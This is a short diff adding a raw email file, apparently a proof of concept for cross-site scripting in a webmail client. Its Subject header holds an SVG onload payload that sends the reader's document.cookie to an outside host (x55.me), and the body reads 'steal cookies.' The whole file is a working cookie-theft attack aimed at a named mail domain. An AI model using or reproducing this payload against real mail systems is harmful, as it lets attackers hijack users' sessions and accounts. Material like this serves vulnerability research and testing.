@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: <svg onload='img=new Image();img.src="//x55.me/geo.php?get="+document.cookie;'>
+To: victim@coremail.com
+MIME-Version: 1.0
+Content-type: text/html
+
+steal cookies.
